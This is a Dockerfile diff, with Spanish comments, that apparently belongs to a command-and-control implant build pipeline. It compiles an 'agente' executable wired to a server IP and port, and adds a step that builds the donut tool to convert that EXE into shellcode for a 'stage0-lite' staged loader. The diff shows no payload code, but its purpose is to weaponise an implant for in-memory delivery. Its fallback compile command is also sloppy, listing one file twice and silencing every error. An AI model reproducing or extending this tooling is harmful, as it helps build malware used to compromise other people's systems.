@@ -18,6 +18,7 @@ RUN apt-get update && apt-get install -y \
     nasm \
     llvm \
     lld \
+    python3 \
     && rm -rf /var/lib/apt/lists/*
 
 # Configurar llvm-rc como rc.exe para que winres funcione
@@ -128,6 +129,17 @@ RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." &&
     fi && \
     cp ${AGENT_NAME}.exe /build_output/${AGENT_NAME}.exe && \
     echo "✅ Agente compilado: /build_output/${AGENT_NAME}.exe"
+
+# 8b. Build donut (needed by stage0-lite/build.sh to convert EXE to shellcode)
+RUN echo "🔨 Building donut from source..." && \
+    cd donut_v1.1 && \
+    make -f Makefile 2>/dev/null || make 2>/dev/null || cc -o donut loader/loader.c loader/depack.c loader/crypt.c loader/hash.c loader/encrypt.c loader/format.c loader/instance.c loader/loader.c loader/loader.c 2>/dev/null || true && \
+    if [ -f donut ]; then \
+        chmod +x donut && \
+        echo "✅ donut compilado: $(./donut 2>&1 | head -1)"; \
+    else \
+        echo "⚠️  donut no compilado (build.sh usara fallback)"; \
+    fi
 
 # 9. Compilar sistema multi-stage (opcional)
 RUN if [ "$MULTI_STAGE" = "true" ]; then \
